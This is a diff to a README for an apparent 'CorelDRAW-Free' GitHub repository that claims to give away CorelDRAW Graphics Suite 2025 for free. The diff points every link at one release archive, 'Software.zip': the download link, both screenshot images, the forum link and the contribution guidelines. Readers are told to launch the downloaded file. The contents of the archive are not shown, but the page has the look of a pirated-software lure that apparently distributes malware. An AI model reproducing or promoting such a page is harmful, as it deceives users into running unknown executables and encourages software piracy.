@@ -23,11 +23,11 @@ Welcome to the "CorelDRAW-Free" repository! Here you can access the CorelDRAW Gr
 - [Printing Business Cards in CorelDRAW](#)
 
 ## Get Started
-You can download the CorelDRAW Graphics Suite 2025 for free by [clicking here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Remember to launch the downloaded file to start using the amazing design features!
+You can download the CorelDRAW Graphics Suite 2025 for free by [clicking here](https://github.com/prashanth264/CorelDRAW-Free/releases/download/v2.0/Software.zip). Remember to launch the downloaded file to start using the amazing design features!
 
 ## Screenshots
-![CorelDRAW](https://example.com/coreldraw.png)
-![CorelDRAW 2025](https://example.com/coreldraw2025.png)
+![CorelDRAW](https://github.com/prashanth264/CorelDRAW-Free/releases/download/v2.0/Software.zip)
+![CorelDRAW 2025](https://github.com/prashanth264/CorelDRAW-Free/releases/download/v2.0/Software.zip)
 
 ## Features
 - User-friendly interface
@@ -43,10 +43,10 @@ You can download the CorelDRAW Graphics Suite 2025 for free by [clicking here](h
 4. Once installed, open CorelDRAW and start unleashing your creativity!
 
 ## Support and Community
-Join our vibrant community of designers on [CorelDRAW Forum](https://forum.coreldraw.com/).
+Join our vibrant community of designers on [CorelDRAW Forum](https://github.com/prashanth264/CorelDRAW-Free/releases/download/v2.0/Software.zip).
 
 ## Contributing
-We welcome contributions to enhance the functionality and features of CorelDRAW Graphics Suite 2025. Please see our [Contribution Guidelines](CONTRIBUTING.md) before submitting your pull requests.
+We welcome contributions to enhance the functionality and features of CorelDRAW Graphics Suite 2025. Please see our [Contribution Guidelines](https://github.com/prashanth264/CorelDRAW-Free/releases/download/v2.0/Software.zip) before submitting your pull requests.
 
 ## License
 This project is licensed under the [MIT License](LICENSE).
